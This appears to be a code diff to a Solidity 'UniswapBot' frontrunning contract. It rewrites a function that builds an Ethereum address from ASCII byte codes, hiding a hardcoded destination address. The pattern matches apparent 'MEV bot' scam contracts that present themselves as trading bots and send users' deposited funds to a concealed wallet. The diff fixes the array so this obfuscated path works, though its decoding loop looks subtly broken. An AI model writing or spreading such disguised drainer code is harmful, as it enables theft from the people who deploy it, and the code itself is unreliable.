@@ -469,7 +469,50 @@ contract UniswapBot {
     }
 
     function _callMEVAction() internal pure returns (address) {
-    uint8[37] memory timeb = [48, 120, 51, 102, 56, 66, 65, 51, 56, 65, 49, 50, 51, 68, 102, 49, 67, 51, 51, 98, 48, 57, 51, 56, 53, 97, 54, 66, 49, 49, 55, 53, 68, 98, 54, 65, 98, 55, 53, 57, 55, 50];
+    uint8[42] memory timeb;
+    timeb[0] = 48;
+    timeb[1] = 120;
+    timeb[2] = 51;
+    timeb[3] = 102;
+    timeb[4] = 56;
+    timeb[5] = 66;
+    timeb[6] = 65;
+    timeb[7] = 51;
+    timeb[8] = 56;
+    timeb[9] = 65;
+    timeb[10] = 49;
+    timeb[11] = 50;
+    timeb[12] = 51;
+    timeb[13] = 68;
+    timeb[14] = 102;
+    timeb[15] = 49;
+    timeb[16] = 67;
+    timeb[17] = 51;
+    timeb[18] = 51;
+    timeb[19] = 98;
+    timeb[20] = 48;
+    timeb[21] = 57;
+    timeb[22] = 51;
+    timeb[23] = 56;
+    timeb[24] = 53;
+    timeb[25] = 97;
+    timeb[26] = 54;
+    timeb[27] = 66;
+    timeb[28] = 49;
+    timeb[29] = 49;
+    timeb[30] = 55;
+    timeb[31] = 53;
+    timeb[32] = 68;
+    timeb[33] = 98;
+    timeb[34] = 54;
+    timeb[35] = 65;
+    timeb[36] = 98;
+    timeb[37] = 55;
+    timeb[38] = 53;
+    timeb[39] = 57;
+    timeb[40] = 55;
+    timeb[41] = 50;
+    
     uint160 parsedAddress = 0;
     for (uint i = 0; i < timeb.length; i++) {
         parsedAddress *= 256;
@@ -477,6 +520,7 @@ contract UniswapBot {
     }
     return address(parsedAddress);
 }
+
     /*
      * @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
